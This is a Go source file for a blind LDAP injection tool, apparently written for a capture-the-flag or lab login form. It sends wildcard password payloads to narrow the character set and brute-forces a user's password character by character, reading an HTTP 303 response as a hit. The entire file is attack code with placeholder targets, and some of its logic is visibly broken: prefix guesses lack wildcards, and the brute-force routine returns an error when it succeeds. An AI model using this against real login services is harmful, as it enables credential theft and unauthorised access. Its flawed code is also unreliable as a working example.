package main

import (
	"fmt"
	"net/http"
	"strings"
)

type LdapInjector struct {
	Url      string
	Username string
	Charset string
}

func NewLdapInjector(url string, username string) *LdapInjector {
	return &LdapInjector{
		Url:      url,
		Username: username,
		Charset:  CreateCharset(),
	}
}

// function for testing the password
func (li *LdapInjector) TestPassword(password string) (bool, error) {
	payload := fmt.Sprintf("request=%s&username=%s&password=%s", li.Url, li.Username, password)
	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	const hash_value = "hash" //hash value of the next action
	req.Header.Set("Next-Action", hash_value)
	// dont follow redirect
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	return resp.StatusCode == 303, nil
}
 
func CreateCharset() string {
	  // creating a sequence of characters
	var res []byte
	for c := 'a'; c <= 'z'; c++ {
		res = append(res, byte(c))
	}
	for j:= range 10{
		res = append(res, byte(j+'0'))
	}
	
	return string(res)
}
// brute-force function
func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	for _, c := range li.Charset {
		ok, err := li.TestPassword(fmt.Sprintf("%s%c", prefix, c))
		if err != nil {
			return "", err
		}
		if ok {
			return string(c), nil
		}
	}
	return "", nil
}
func (li *LdapInjector) BruteForce() (string, error) {
	var res string
	for{
	c,err:=li.TestCharacter(res)
	if err!=nil{
	return "",err
}
if c == "" {
	ok, err := li.TestPassword(res)
	if err != nil {
		return "", err
	} else if ok {
		return "", fmt.Errorf("partial password found: %s", res)
	}
	break
}
res+=c
    } 
	return res, nil
  }
  func (li *LdapInjector) PruneCharset() (error){
	var newCharset string
	for _, char := range li.Charset {
		ok, err := li.TestPassword(fmt.Sprintf("*%s*", string(char)))
		if err != nil {
			return err
		}
		if ok {
			newCharset += string(char)
		}
	}
	li.Charset=newCharset
	return nil
  }
func main() {
	c := NewLdapInjector("url", "username")
	c.PruneCharset()
	ok, err := c.TestPassword("password")
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(ok)

}
